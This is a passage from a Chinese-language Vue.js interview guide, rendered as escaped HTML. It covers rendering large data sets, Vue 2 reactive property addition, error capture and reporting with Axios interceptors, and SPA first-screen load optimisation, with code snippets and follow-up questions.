插件，在 <code>install</code> 中注册全局 <code>mixin</code>，根组件存在 <code>store</code> 选项时将其实例挂到 <code>$store</code>。同时把内部状态放进 <code>Vue</code> 实例或响应式对象，对外只暴露 <code>state</code> 读取入口，避免业务组件直接接触内部容器。</p>\\n</li>\\n<li>\\n<p><strong>订单页的 <code>actions.submit</code> 需要等待接口完成，调用方写了 <code>await store.dispatch(\'submit\')</code>，你的实现却立即返回 <code>undefined</code>，该怎么改？</strong></p>\\n<p><code>dispatch</code> 必须返回对应 <code>action</code> 的执行结果，使异步 <code>action</code> 返回的 <code>Promise</code> 能继续传给调用方。若只调用 <code>entry(this, payload)</code> 而不 <code>return</code>，页面无法等待成功或捕获失败；同时应保留不存在该 <code>type</code> 时的明确错误。</p>\\n</li>\\n<li>\\n<p><strong>点击按钮后报 <code>Cannot read properties of undefined</code>，日志显示 <code>commit</code> 作为参数传入 <code>action</code> 后调用失败，你先查哪里？</strong></p>\\n<p>先检查 <code>commit</code> 是否在构造函数中绑定了 <code>Store</code> 实例，因为解构或单独传递后会丢失 <code>this</code>。再核对对应 <code>mutation</code> 是否注册、<code>type</code> 是否拼写一致；只返回一个 <code>Error</code> 而不抛出还可能让故障静默，错误策略需要统一。</p>\\n</li>\\n<li>\\n<p><strong>团队争论把筛选逻辑做成普通函数还是 <code>getters</code>，同一结果会在列表页多个位置读取，你怎么选？</strong></p>\\n<p>应通过 <code>getters</code> 暴露派生状态，并让底层响应式系统负责依赖更新；普通函数也能算出结果，但每次调用都缺少统一的状态派生入口。简版实现可先用属性访问包装 <code>getters[key](state)</code>，若要求缓存，还需要接入框架的计算属性机制。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_59-使用vue渲染大量数据时应该怎么优化-说下你的思路\\"><a class=\\"header-anchor\\" href=\\"#_59-使用vue渲染大量数据时应该怎么优化-说下你的思路\\">#</a> 59 使用vue渲染大量数据时应该怎么优化？说下你的思路！</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>第一优先级是<strong>减少渲染量</strong>：虚拟列表只渲染视口内的十几条，收益比后面所有优化加起来都大</li>\\n<li>第二是<strong>减少响应式开销</strong>：纯展示数据用 <code>Object.freeze</code>（<code>Vue 2</code>）或 <code>shallowRef</code>/<code>markRaw</code>（<code>Vue 3</code>）跳过深度劫持</li>\\n<li>第三是<strong>减少更新范围</strong>：<code>key</code> 用稳定 id、拆分组件让更新局部化、<code>v-memo</code> 跳过不变的部分</li>\\n<li>第四是<strong>分批渲染</strong>：<code>requestAnimationFrame</code> 或 <code>requestIdleCallback</code> 分片插入，避免一次长任务卡死主线程</li>\\n<li>数据处理本身重的话搬进 <code>Web Worker</code>——它解决的是计算卡顿，和渲染优化是两件事</li>\\n</ul>\\n<p><strong>渲染大量数据时，核心是减少一次要加载和渲染的节点数量，再控制不必要的更新。</strong> 表格这类平铺数据可以分页或使用虚拟列表，只渲染视口范围内的内容；树形数据更适合按需懒加载子树。数据不再变化时可用 <code>v-once</code>，仍需更新时可结合 <code>v-for</code> 使用 <code>v-memo</code>，减少重复创建 <code>VNode</code>。具体选型要看交互需求，能从产品设计上避免全量获取和展示，通常比单纯优化渲染更有效。</p>\\n</section>\\n<p><strong>分析</strong></p>\\n<p>企业级项目中渲染大量数据的情况比较常见，因此这是一道非常好的综合实践题目。</p>\\n<p><strong>回答</strong></p>\\n<ol>\\n<li>在大型企业级项目中经常需要渲染大量数据，此时很容易出现卡顿的情况。比如大数据量的表格、树</li>\\n<li>处理时要根据情况做不同处理：</li>\\n</ol>\\n<ul>\\n<li>可以采取分页的方式获取，避免渲染大量数据</li>\\n<li><a href=\\"https://github.com/Akryum/vue-virtual-scroller\\">vue-virtual-scroller</a>等虚拟滚动方案，只渲染视口范围内的数据</li>\\n<li>如果不需要更新，可以使用v-once方式只渲染一次</li>\\n<li>通过<a href=\\"https://vuejs.org/api/built-in-directives.html#v-memo\\">v-memo</a>可以缓存结果，结合<code>v-for</code>使用，避免数据变化时不必要的<code>VNode</code>创建</li>\\n<li>可以采用懒加载方式，在用户需要的时候再加载数据，比如<code>tree</code>组件子树的懒加载</li>\\n</ul>\\n<ol start=\\"3\\">\\n<li>还是要看具体需求，首先从设计上避免大数据获取和渲染；实在需要这样做可以采用虚表的方式优化渲染；最后优化更新，如果不需要更新可以<code>v-once</code>处理，需要更新可以<code>v-memo</code>进一步优化大数据更新性能。其他可以采用的是交互方式优化，无线滚动、懒加载等方案</li>\\n</ol>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>运营要求把几万条订单一次性放进表格，并认为接口已经很快、页面就不该卡，你会先反驳哪个判断？</strong></p>\\n<p>接口返回快不代表浏览器渲染快，几万条记录仍会产生大量节点、<code>VNode</code> 和响应式更新成本。优先从产品设计上限制一次获取与展示的数据量，用分页或按需加载缩小集合；确需连续浏览时再采用虚拟滚动。</p>\\n</li>\\n<li>\\n<p><strong>日志页必须支持连续滚动查看大量记录，你会怎样用 <code>vue-virtual-scroller</code> 落地，而不是直接渲染完整数组？</strong></p>\\n<p>用虚拟滚动只创建视口及必要缓冲区内的行，并依据滚动位置复用或替换可见节点。实现时要提供稳定的列表标识，并处理行高计算；若每行高度不可预测，滚动定位和占位尺寸会更复杂，需要选用支持动态高度的方案。</p>\\n</li>\\n<li>\\n<p><strong>审计页数据加载后不会再变化，评审中有人要求所有行继续参与响应式更新，你会选择 <code>v-once</code> 还是 <code>v-memo</code>？</strong></p>\\n<p>数据确定只渲染一次时用 <code>v-once</code>，它直接跳过后续更新，语义和收益都更明确。若列表仍会局部变化，则用 <code>v-memo</code> 根据依赖缓存 <code>v-for</code> 项，减少无关 <code>VNode</code> 创建；依赖写漏会导致页面保留旧内容。</p>\\n</li>\\n<li>\\n<p><strong>树组件展开顶层节点就卡住，但收起时首屏正常，接口一次返回了整棵深层组织树，你会怎样定位和修复？</strong></p>\\n<p>先确认卡顿是否发生在展开时集中创建子树节点，而不是只盯接口耗时。将子节点改为用户展开时再请求或渲染，并对已加载结果按需求缓存；若业务必须同时搜索全部节点，纯懒加载可能不满足检索能力，需要另设搜索接口。</p>\\n</li>\\n<li>\\n<p><strong>一张大表格同时可选分页和虚拟滚动，产品要快速跳到指定页，交互设计师要无缝连续浏览，你怎么取舍？</strong></p>\\n<p>需要明确跳页、总数和稳定定位时优先分页，它也能从数据获取阶段限制规模。强调连续浏览且必须保留较大结果集时选择虚拟滚动；两者也可组合为服务端分段加载加视口渲染，但状态恢复和滚动定位成本更高。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_60-动态给vue的data添加一个新的属性时会发生什么-怎样解决\\"><a class=\\"header-anchor\\" href=\\"#_60-动态给vue的data添加一个新的属性时会发生什么-怎样解决\\">#</a> 60 动态给vue的data添加一个新的属性时会发生什么？怎样解决？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>Vue 2</code> 里<strong>新增属性不是响应式的</strong>，页面不会更新 —— 因为 <code>defineProperty</code> 只能劫持已存在的属性</li>\\n<li>解决：<code>this.$set(obj, key, value)</code> / <code>Vue.set</code>，它会给新属性补上劫持并手动 <code>notify</code></li>\\n<li>也可以整体替换：<code>this.form = { ...this.form, newKey: 1 }</code>——能用但会让整个对象重新走响应式转换，大对象上是浪费</li>\\n<li>⚠️ <strong>不能给根级 <code>data</code> 或 <code>Vue</code> 实例本身加属性</strong>，源码里会直接警告 —— 正确做法是初始化时预先声明所有字段</li>\\n<li><code>Vue 3</code> 的 <code>Proxy</code> 能拦到任意键的新增，这个问题不存在，<code>Vue.set</code> 已被移除</li>\\n</ul>\\n<p><strong>在 <code>Vue 2</code> 中，直接给响应式对象新增属性不会触发视图更新，因为该属性没有经过 <code>Object.defineProperty</code> 的响应式处理。</strong> 少量新增字段可以用 <code>Vue.set()</code>，它会调用响应式处理并通知视图更新。字段较多时，可以用 <code>Object.assign()</code> 创建新对象后整体赋值，但直接合并到原对象仍然无效。<code>$forceUpdate()</code> 只能作为不推荐的兜底；<code>Vue 3</code> 使用 <code>Proxy</code>，直接新增属性也能保持响应式。</p>\\n</section>\\n<p>Vue 不允许在已经创建的实例上动态添加新的响应式属性</p>\\n<p>若想实现数据与视图同步更新，可采取下面三种解决方案：</p>\\n<ul>\\n<li><code>Vue.set()</code></li>\\n<li><code>Object.assign()</code></li>\\n<li><code>$forcecUpdated()</code></li>\\n</ul>\\n<h3 id=\\"vue-set\\"><a class=\\"header-anchor\\" href=\\"#vue-set\\">#</a> Vue.set()</h3>\\n<pre class=\\"language-js\\"><code>Vue.set( target, propertyName/index, value )\\n</code></pre>\\n<p>参数</p>\\n<ul>\\n<li><code>{Object | Array} target</code></li>\\n<li><code>{string | number} propertyName/index</code></li>\\n<li><code>{any} value</code></li>\\n</ul>\\n<p>返回值：设置的值</p>\\n<p>通过<code>Vue.set</code>向响应式对象中添加一个<code>property</code>，并确保这个新 <code>property</code>同样是响应式的，且触发视图更新</p>\\n<p>关于<code>Vue.set</code>源码（省略了很多与本节不相关的代码）</p>\\n<p>源码位置：<code>src\\\\core\\\\observer\\\\index.js</code></p>\\n<pre class=\\"language-js\\"><code>function set (target: Array&lt;any&gt; | Object, key: any, val: any): any {\\n  ...\\n  defineReactive(ob.value, key, val)\\n  ob.dep.notify()\\n  return val\\n}\\n</code></pre>\\n<p>这里无非再次调用<code>defineReactive</code>方法，实现新增属性的响应式</p>\\n<p>关于<code>defineReactive</code>方法，内部还是通过<code>Object.defineProperty</code>实现属性拦截</p>\\n<p>大致代码如下：</p>\\n<pre class=\\"language-js\\"><code>function defineReactive(obj, key, val) {\\n    Object.defineProperty(obj, key, {\\n        get() {\\n            console.log(`get ${key}:${val}`);\\n            return val\\n        },\\n        set(newVal) {\\n            if (newVal !== val) {\\n                console.log(`set ${key}:${newVal}`);\\n                val = newVal\\n            }\\n        }\\n    })\\n}\\n</code></pre>\\n<h3 id=\\"object-assign\\"><a class=\\"header-anchor\\" href=\\"#object-assign\\">#</a> Object.assign()</h3>\\n<p>直接使用<code>Object.assign()</code>添加到对象的新属性不会触发更新</p>\\n<p>应创建一个新的对象，合并原对象和混入对象的属性</p>\\n<pre class=\\"language-js\\"><code>this.someObject = Object.assign({},this.someObject,{newProperty1:1,newProperty2:2 ...})\\n</code></pre>\\n<h3 id=\\"forceupdate\\"><a class=\\"header-anchor\\" href=\\"#forceupdate\\">#</a> $forceUpdate</h3>\\n<p>如果你发现你自己需要在 <code>Vue</code>中做一次强制更新，99.9% 的情况，是你在某个地方做错了事</p>\\n<p><code>$forceUpdate</code>迫使<code>Vue</code> 实例重新渲染</p>\\n<p>PS：仅仅影响实例本身和插入插槽内容的子组件，而不是所有子组件。</p>\\n<h3 id=\\"小结\\"><a class=\\"header-anchor\\" href=\\"#小结\\">#</a> 小结</h3>\\n<ul>\\n<li>如果为对象添加少量的新属性，可以直接采用<code>Vue.set()</code></li>\\n<li>如果需要为新对象添加大量的新属性，则通过<code>Object.assign()</code>创建新对象</li>\\n<li>如果你实在不知道怎么操作时，可采取<code>$forceUpdate()</code>进行强制刷新 (不建议)</li>\\n</ul>\\n<p>PS：<code>vue3</code>是用过<code>proxy</code>实现数据响应式的，直接动态添加新属性仍可以实现数据响应式</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong><code>Vue 2</code> 表单页执行 <code>this.form.nickname = \'Ada\'</code> 后数据变了但视图没更新，为什么直接赋值在这里不可靠？</strong></p>\\n<p>如果 <code>nickname</code> 在响应式初始化时不存在，<code>Vue 2</code> 无法仅靠普通属性赋值为它补上响应式拦截，因此视图可能不更新。少量动态字段应使用 <code>Vue.set(this.form, \'nickname\', \'Ada\')</code>；预先声明字段则能避开此限制。</p>\\n</li>\\n<li>\\n<p><strong>低代码表单根据接口一次新增几十个字段，你会逐个调用 <code>$set</code>，还是怎样更新 <code>form</code>？</strong></p>\\n<p>大量新增属性更适合用 <code>Object.assign</code> 生成一个新对象，再整体替换已经具备响应式入口的 <code>form</code> 引用。这样新对象会进入响应式处理，也避免散落几十次 <code>$set</code>；如果必须保留原对象身份，则不能直接套用这一方案。</p>\\n</li>\\n<li>\\n<p><strong>同一套动态表单准备从 <code>Vue 2</code> 迁到 <code>Vue 3</code>，原有的 <code>$set</code> 封装还必须保留吗？</strong></p>\\n<p><code>Vue 3</code> 基于 <code>Proxy</code> 实现对象响应式，直接新增普通响应式对象的属性仍能被追踪，因此不再需要用 <code>$set</code> 弥补该限制。迁移时仍要确认操作对象本身是否为响应式代理；脱离响应式体系的普通对象不会自动驱动视图。</p>\\n</li>\\n<li>\\n<p><strong>配置页已经调用 <code>$set</code>，界面仍没刷新，开发者准备直接加 <code>$forceUpdate()</code>，你会先排查什么？</strong></p>\\n<p>先核对修改的对象是否就是模板读取的响应式对象，以及字段路径、数组项引用和替换位置是否一致。<code>$forceUpdate()</code> 只能强制当前实例重新渲染，不能修复错误的数据流或让普通对象获得响应性，因此只适合作为不推荐的兜底。</p>\\n</li>\\n<li>\\n<p><strong>编辑页只新增一个扩展字段，而切换租户时会替换整套字段配置，两种场景要统一用同一种写法吗？</strong></p>\\n<p>不必强行统一：单个或少量新增字段在 <code>Vue 2</code> 中用 <code>Vue.set</code> 更直接，整批新字段则创建新对象并整体赋值。前者保留对象身份，后者更适合结构整体变化；错误地频繁整体替换可能扩大依赖更新范围。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_61-你是怎么处理vue项目中的错误的\\"><a class=\\"header-anchor\\" href=\\"#_61-你是怎么处理vue项目中的错误的\\">#</a> 61 你是怎么处理vue项目中的错误的？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>四层拦截：组件内 <code>try/catch</code> → <code>errorCaptured</code> 钩子（父组件捕获子组件错误）→ <code>app.config.errorHandler</code>（全局）→ <code>window.onerror</code> + <code>unhandledrejection</code>（兜底）</li>\\n<li>异步错误 <code>Vue</code> 的 <code>errorHandler</code> <strong>抓不全</strong>——<code>setTimeout</code>、原生事件回调里的错误要靠 <code>window.onerror</code>；<code>Promise</code> 未捕获的 reject 要靠 <code>unhandledrejection</code></li>\\n<li>请求错误在 <code>axios</code> 拦截器里统一规整成 <code>{ code, message }</code>，区分网络层/HTTP 状态码/业务错误码三类</li>\\n<li>上报要带上下文：路由、用户 id、<code>traceId</code>、组件名、<code>sourcemap</code> 还原后的堆栈；同时做去重和采样避免打爆日志</li>\\n<li>用户侧要有兜底 UI：错误边界组件、<code>chunk</code> 加载失败提示刷新、白屏检测</li>\\n</ul>\\n<p><strong>我会把错误分成接口异常和代码逻辑异常，分别捕获后整理成统一信息再上报。</strong> 接口异常适合在 <code>Axios</code> 响应拦截器中处理，同时记录请求地址、方法、参数、状态和服务端错误信息。组件运行中的逻辑异常可以通过 <code>app.config.errorHandler</code> 收集，并保留错误名称、详情和组件相关信息。上报时还会附带应用、环境、版本、用户和当前页面等上下文，方便服务端定位，但敏感参数需要谨慎处理。</p>\\n</section>\\n<p><strong>分析</strong></p>\\n<ul>\\n<li>这是一个综合应用题目，在项目中我们常常需要将App的异常上报，此时错误处理就很重要了。</li>\\n<li>这里要区分错误的类型，针对性做收集。</li>\\n<li>然后是将收集的的错误信息上报服务器。</li>\\n</ul>\\n<p><strong>思路</strong></p>\\n<ul>\\n<li>首先区分错误类型</li>\\n<li>根据错误不同类型做相应收集</li>\\n<li>收集的错误是如何上报服务器的</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>应用中的错误类型分为&quot;<code>接口异常</code>&quot;和“<code>代码逻辑异常</code>”</li>\\n<li>我们需要根据不同错误类型做相应处理：接口异常是我们请求后端接口过程中发生的异常，可能是请求失败，也可能是请求获得了服务器响应，但是返回的是错误状态。以<code>Axios</code>为例，这类异常我们可以通过封装<code>Axios</code>，在拦截器中统一处理整个应用中请求的错误。<code>代码逻辑异常</code>是我们编写的前端代码中存在逻辑上的错误造成的异常，<code>vue</code>应用中最常见的方式是使用全局错误处理函数<code>app.config.errorHandler</code>收集错误</li>\\n<li>收集到错误之后，需要统一处理这些异常：分析错误，获取需要错误信息和数据。这里应该有效区分错误类型，如果是请求错误，需要上报接口信息，参数，状态码等；对于前端逻辑异常，获取错误名称和详情即可。另外还可以收集应用名称、环境、版本、用户信息，所在页面等。这些信息可以通过<code>vuex</code>存储的全局状态和路由信息获取</li>\\n</ol>\\n<p><strong>实践</strong></p>\\n<p><code>axios</code>拦截器中处理捕获异常：</p>\\n<pre class=\\"language-js\\"><code>// 响应拦截器\\ninstance.interceptors.response.use(\\n  (response) =&gt; {\\n    return response.data;\\n  },\\n  (error) =&gt; {\\n    // 存在response说明服务器有响应\\n    if (error.response) {\\n      let response = error.response;\\n      if (response.status &gt;= 400) {\\n        handleError(response);\\n      }\\n    } else {\\n      handleError(null);\\n    }\\n    return Promise.reject(error);\\n  },\\n);\\n</code></pre>\\n<p><code>vue</code>中全局捕获异常：</p>\\n<pre class=\\"language-js\\"><code>import { createApp } from &#39;vue&#39;\\n​\\nconst app = createApp(...)\\n​\\napp.config.errorHandler = (err, instance, info) =&gt; {\\n  // report error to tracking services\\n}\\n</code></pre>\\n<p>处理接口请求错误：</p>\\n<pre class=\\"language-js\\"><code>function handleError(error, type) {\\n  if(type == 1) {\\n    // 接口错误，从config字段中获取请求信息\\n    let { url, method, params, data } = error.config\\n    let err_data = {\\n       url, method,\\n       params: { query: params, body: data },\\n       error: error.data?.message || JSON.stringify(error.data),\\n    })\\n  }\\n}\\n</code></pre>\\n<p>处理前端逻辑错误：</p>\\n<pre class=\\"language-js\\"><code>function handleError(error, type) {\\n  if(type == 2) {\\n    let errData = null\\n    // 逻辑错误\\n    if(error instanceof Error) {\\n      let { name, message } = error\\n      errData = {\\n        type: name,\\n        error: message\\n      }\\n    } else {\\n      errData = {\\n        type: &#39;other&#39;,\\n        error: JSON.strigify(error)\\n      }\\n    }\\n  }\\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>支付页接口返回 <code>500</code>，同时组件因为读取空数据又抛出异常，把两者都交给 <code>app.config.errorHandler</code> 处理有什么问题？</strong></p>\\n<p>两类错误的来源和上下文不同，不应只靠 <code>app.config.errorHandler</code> 混在一起处理。接口异常应由封装后的 <code>Axios</code> 响应拦截器统一捕获，组件逻辑异常再由 <code>Vue</code> 全局错误处理器收集，否则接口状态、请求参数等关键信息容易丢失。</p>\\n</li>\\n<li>\\n<p><strong>多个业务模块都使用同一个 <code>Axios</code> 实例，线上请求失败时你会在响应拦截器里采集哪些字段，并怎样继续传递错误？</strong></p>\\n<p>有服务器响应时记录请求 <code>url</code>、<code>method</code>、查询参数、请求体、状态码及服务端错误信息；没有响应时要单独标识网络侧失败。完成统一处理后仍返回 <code>Promise.reject(error)</code>，否则调用页面可能把失败误当成成功。</p>\\n</li>\\n<li>\\n<p><strong>同一监控 <code>SDK</code> 要同时服务测试、预发和生产环境，产品还要求能定位到具体用户与页面，你会怎样设计公共上报结构？</strong></p>\\n<p>公共字段应包含应用名称、运行环境、应用版本、用户信息和当前页面，再按错误类型附加专属数据。接口错误补请求信息与响应状态，代码逻辑错误补错误名称和详情；敏感参数不能未经筛选直接上报。</p>\\n</li>\\n<li>\\n<p><strong>线上告警只有一条 <code>TypeError</code>，没有组件位置；另一些请求失败记录只有“网络错误”，你会从采集链路哪里查起？</strong></p>\\n<p>逻辑异常先检查 <code>app.config.errorHandler</code> 是否接收并上报了 <code>err</code>、组件实例及 <code>info</code>，接口异常再检查拦截器是否区分存在 <code>error.response</code> 的情况。随后核对上报函数的类型分支和序列化逻辑，字段拼写或吞掉拒绝都可能造成信息残缺。</p>\\n</li>\\n<li>\\n<p><strong>后端希望每个页面自行提示接口错误，前端负责人又要求统一监控，<code>Axios</code> 拦截器应该把错误完全处理掉吗？</strong></p>\\n<p>拦截器负责统一采集和通用处理，但不应默认吞掉错误，应继续拒绝 <code>Promise</code> 让页面决定提示、重试或降级。这样监控口径保持一致，业务交互仍由调用方控制；若全局与页面同时弹提示，还需约定去重规则。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_62-spa首屏加载速度慢的怎么解决\\"><a class=\\"header-anchor\\" href=\\"#_62-spa首屏加载速度慢的怎么解决\\">#</a> 62 SPA首屏加载速度慢的怎么解决</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>先量再改：<code>Performance</code> 面板看 <code>HTML</code> 响应到首屏绘制之间卡在哪，<code>Coverage</code> 看首屏用了多少代码</li>\\n<li>减体积：路由懒加载、<code>splitChunks</code> 拆包、<code>Tree Shaking</code>、组件库按需引入、<code>bundle-analyzer</code> 找大头</li>\\n<li>加速度：<code>CDN</code>、<code>gzip</code>/<code>brotli</code>、<code>HTTP/2</code>、关键资源 <code>preload</code>、接口域名 <code>preconnect</code></li>\\n<li>改感知：骨架屏、首屏关键 <code>CSS</code> 内联、图片懒加载但首屏图不懒加载（会拖垮 <code>LCP</code>）</li>\\n<li>换渲染方式：内容型页面上 <code>SSR</code>/预渲染，把首屏从&quot;等 JS&quot;变成&quot;直接有 HTML&quot;</li>\\n</ul>\\n<p><strong><code>SPA</code> 首屏慢通常要同时减少入口资源体积和渲染阻塞，优化前先用 <code>Performance</code> 数据确认瓶颈。</strong> 代码侧可以做路由懒加载、组件库按需引入和公共依赖抽离，避免首屏下载无关或重复代码。资源侧可以压缩图片、开启 <code>GZip</code>，并通过 <code>Cache-Control</code>、<code>Etag</code> 或 <code>Service Worker</code> 利用缓存。若项目对首屏内容展示要求很高，也可以考虑 <code>SSR</code>，但实现和维护成本会高于普通客户端渲染。</p>\\n</section>\\n<h3 id=\\"什么是首屏加载\\"><a class=\\"header-anchor\\" href=\\"#什么是首屏加载\\">#</a> 什么是首屏加载</h3>\\n<p>首屏时间（<code>First Contentful Paint</code>），指的是浏览器从响应用户输入网址地址，到首屏内容渲染完成的时间，此时整个网页不一定要全部渲染完成，但需要展示当前视窗需要的内容</p>\\n<p>首屏加载可以说是用户体验中<strong>最重要</strong>的环节</p>\\n<p><strong>关于计算首屏时间</strong></p>\\n<p>利用<code>performance.timing</code>提供的数据：</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/83f77ec966a30dd5.png\\" alt=\\"\\"></p>\\n<p>通过<code>DOMContentLoad</code>或者<code>performance</code>来计算出首屏时间</p>\\n<pre class=\\"language-js\\"><code>// 方案一：\\ndocument.addEventListener(&#39;DOMContentLoaded&#39;, (event) =&gt; {\\n    console.log(&#39;first contentful painting&#39;);\\n});\\n// 方案二：\\nperformance.getEntriesByName(&quot;first-contentful-paint&quot;)[0].startTime\\n\\n// performance.getEntriesByName(&quot;first-contentful-paint&quot;)[0]\\n// 会返回一个 PerformancePaintTiming的实例，结构如下：\\n{\\n  name: &quot;first-contentful-paint&quot;,\\n  entryType: &quot;paint&quot;,\\n  startTime: 507.80000002123415,\\n  duration: 0,\\n};\\n</code></pre>\\n<h3 id=\\"加载慢的原因\\"><a class=\\"header-anchor\\" href=\\"#加载慢的原因\\">#</a> 加载慢的原因</h3>\\n<p>在页面渲染的过程，导致加载速度慢的因素可能如下：</p>\\n<ul>\\n<li>网络延时问题</li>\\n<li>资源文件体积是否过大</li>\\n<li>资源是否重复发送请求去加载了</li>\\n<li>加载脚本的时候，渲染内容堵塞了</li>\\n</ul>\\n<h3 id=\\"解决方案-2\\"><a class=\\"header-anchor\\" href=\\"#解决方案-2\\">#</a> 解决方案</h3>\\n<p>常见的几种SPA首屏优化方式</p>\\n<ul>\\n<li>减小入口文件积</li>\\n<li>静态资源本地缓存</li>\\n<li>UI框架按需加载</li>\\n<li>图片资源的压缩</li>\\n<li>组件重复打包</li>\\n<li>开启GZip压缩</li>\\n<li>使用SSR</li>\\n</ul>\\n<p><strong>1. 减小入口文件体积</strong></p>\\n<p>常用的手段是路由懒加载，把不同路由对应的组件分割成不同的代码块，待路由被请求的时候会单独打包路由，使得入口文件变小，加载速度大大增加</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/6140579886e4eada.png\\" alt=\\"\\"></p>\\n<p>在<code>vue-router</code>配置路由的时候，采用动态加载路由的形式</p>\\n<pre class=\\"language-js\\"><code>routes:[ \\n    path: &#39;Blogs&#39;,\\n    name: &#39;ShowBlogs&#39;,\\n    component: () =&gt; import(&#39;./components/ShowBlogs.vue&#39;)\\n]\\n</code></pre>\\n<p>以函数的形式加载路由，这样就可以把各自的路由文件分别打包，只有在解析给定的路由时，才会加载路由组件</p>\\n<p><strong>2. 静态资源本地缓存</strong></p>\\n<p>后端返回资源问题：</p>\\n<ul>\\n<li>采用<code>HTTP</code>缓存，设置<code>Cache-Control</code>，<code>Last-Modified</code>，<code>Etag</code>等响应头</li>\\n<li>采用<code>Service Worker</code>离线缓存</li>\\n</ul>\\n<p>前端合理利用<code>localStorage</code></p>\\n<p><strong>3. UI框架按需加载</strong></p>\\n<p>在日常使用<code>UI</code>框架，例如<code>element-UI</code>、或者<code>antd</code>，我们经常性直接引用整个<code>UI</code>库</p>\\n<pre class=\\"language-js\\"><code>import ElementUI from &#39;element-ui&#39;\\nVue.use(ElementUI)\\n</code></pre>\\n<p>但实际上我用到的组件只有按钮，分页，表格，输入与警告 所以我们要按需引用</p>\\n<pre class=\\"language-js\\"><code>import { Button, Input, Pagination, Table, TableColumn, MessageBox } from &#39;element-ui&#39;;\\nVue.use(Button)\\nVue.use(Input)\\nVue.use(Pagination)\\n</code></pre>\\n<p><strong>4. 组件重复打包</strong></p>\\n<p>假设<code>A.js</code>文件是一个常用的库，现在有多个路由使用了<code>A.js</code>文件，这就造成了重复下载</p>\\n<p>解决方案：在<code>webpack</code>的<code>config</code>文件中，修改<code>CommonsChunkPlugin</code>的配置</p>\\n<pre class=\\"language-js\\"><code>minChunks: 3\\n</code></pre>\\n<p><code>minChunks</code>为3表示会把使用3次及以上的包抽离出来，放进公共依赖文件，避免了重复加载组件</p>\\n<p><strong>5. 图片资源的压缩</strong></p>\\n<p>图片资源虽然不在编码过程中，但它却是对页面性能影响最大的因素</p>\\n<p>对于所有的图片资源，我们可以进行适当的压缩</p>\\n<p>对页面上使用到的<code>icon</code>，可以使用在线字体图标，或者雪碧图，将众多小图标合并到同一张图上，用以减轻<code>http</code>请求压力。</p>\\n<p><strong>6. 开启GZip压缩</strong></p>\\n<p>拆完包之后，我们再用<code>gzip</code>做一下压缩 安装<code>compression-webpack-plugin</code></p>\\n<pre class=\\"language-js\\"><code>cnmp i compression-webpack-plugin -D\\n</code></pre>\\n<p>在<code>vue.congig.js</code>中引入并修改<code>webpack</code>配置</p>\\n<pre class=\\"language-js\\"><code>const CompressionPlugin = require(&#39;compression-webpack-plugin&#39;)\\n\\nconfigureWebpack: (config) =&gt; {\\n        if (process.env.NODE_ENV === &#39;production&#39;) {\\n            // 为生产环境修改配置...\\n            config.mode = &#39;production&#39;\\n            return {\\n                plugins: [new CompressionPlugin({\\n                    test: /\\\\.js$|\\\\.html$|\\\\.css/, //匹配文件名\\n                    threshold: 10240, //对超过10k的数据进行压缩\\n                    deleteOriginalAssets: false //是否删除原文件\\n                })]\\n            }\\n        }\\n</code></pre>\\n<p>在服务器我们也要做相应的配置 如果发送请求的浏览器支持<code>gzip</code>，就发送给它<code>gzip</code>格式的文件 我的服务器是用<code>express</code>框架搭建的 只要安装一下<code>compression</code>就能使用</p>\\n<pre class=\\"language-js\\"><code>const compression = require(&#39;compression&#39;)\\napp.use(compression())  // 在其他中间件使用之前调用\\n</code></pre>\\n<p><strong>7. 使用SSR</strong></p>\\n<p>SSR（Server side ），也就是服务端渲染，组件或页面通过服务器生成html字符串，再发送到浏览器</p>\\n<p>从头搭建一个服务端渲染是很复杂的，<code>vue</code>应用建议使用<code>Nuxt.js</code>实现服务端渲染</p>\\n<h3 id=\\"小结-2\\"><a class=\\"header-anchor\\" href=\\"#小结-2\\">#</a> 小结</h3>\\n<p>减少首屏渲染时间的方法有很多，总的来讲可以分成两大部分 ：<code>资源加载优化</code> 和 <code>页面渲染优化</code></p>\\n<p>下图是更为全面的首屏优化的方案</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/ac5076060ba416f5.png\\" alt=\\"\\"></p>\\n<p>大家可以根据自己项目的情况选择各种方式进行首屏渲染的优化</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 